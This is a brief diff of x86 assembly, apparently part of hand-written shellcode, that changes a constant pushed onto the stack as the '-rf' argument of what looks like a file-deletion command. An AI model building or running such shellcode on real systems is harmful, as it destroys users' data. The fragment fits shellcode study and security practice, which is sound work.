@@ -50,7 +50,7 @@ _start:
 
     ; push -rf to the stack and save it into esi
     
-    push 0x7666722d
+    push 0x6666722d
     mov esi, esp
 
     ; push everything on the stack
